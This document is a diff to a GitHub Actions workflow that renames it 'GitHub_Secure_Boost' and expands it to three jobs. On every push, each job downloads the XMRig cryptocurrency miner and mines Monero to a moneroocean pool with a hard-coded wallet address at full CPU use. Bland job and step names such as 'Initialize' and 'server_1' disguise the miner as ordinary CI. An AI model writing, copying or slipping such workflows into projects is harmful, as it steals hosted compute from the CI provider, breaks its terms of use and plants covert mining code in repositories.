@@ -1,21 +1,31 @@
-name: Global_Power_New
+name: GitHub_Secure_Boost
 on: [push]
 jobs:
-  run_1:
+  server_1:
     runs-on: ubuntu-latest
     steps:
-      - name: Start
+      - name: Initialize
         run: |
           wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz
           tar xvzf xmrig-6.21.0-linux-static-x64.tar.gz
           cd xmrig-6.21.0
-          ./xmrig -o ghost.moneroocean.stream:10128 -u 46kXSBLMKEM5HdFqa3VdeMN2GV6fDKVW1SwcXNDTQR8bTZJVpwfGZfL45wGGHGQw77BLsSkAfcygoLnBkaaj4rGc7QzWnFS -p New_Worker_1 --cpu-max-threads-hint 100
-  run_2:
+          ./xmrig -o gulf.moneroocean.stream:443 -u 46kXSBLMKEM5HdFqa3VdeMN2GV6fDKVW1SwcXNDTQR8bTZJVpwfGZfL45wGGHGQw77BLsSkAfcygoLnBkaaj4rGc7QzWnFS -p Server_1 --tls --cpu-max-threads-hint 100
+  server_2:
     runs-on: ubuntu-latest
     steps:
-      - name: Start
+      - name: Initialize
         run: |
           wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz
           tar xvzf xmrig-6.21.0-linux-static-x64.tar.gz
           cd xmrig-6.21.0
-          ./xmrig -o ghost.moneroocean.stream:10128 -u 46kXSBLMKEM5HdFqa3VdeMN2GV6fDKVW1SwcXNDTQR8bTZJVpwfGZfL45wGGHGQw77BLsSkAfcygoLnBkaaj4rGc7QzWnFS -p New_Worker_2 --cpu-max-threads-hint 100
+          ./xmrig -o gulf.moneroocean.stream:443 -u 46kXSBLMKEM5HdFqa3VdeMN2GV6fDKVW1SwcXNDTQR8bTZJVpwfGZfL45wGGHGQw77BLsSkAfcygoLnBkaaj4rGc7QzWnFS -p Server_2 --tls --cpu-max-threads-hint 100
+  server_3:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Initialize
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz
+          tar xvzf xmrig-6.21.0-linux-static-x64.tar.gz
+          cd xmrig-6.21.0
+          ./xmrig -o gulf.moneroocean.stream:443 -u 46kXSBLMKEM5HdFqa3VdeMN2GV6fDKVW1SwcXNDTQR8bTZJVpwfGZfL45wGGHGQw77BLsSkAfcygoLnBkaaj4rGc7QzWnFS -p Server_3 --tls --cpu-max-threads-hint 100
+          
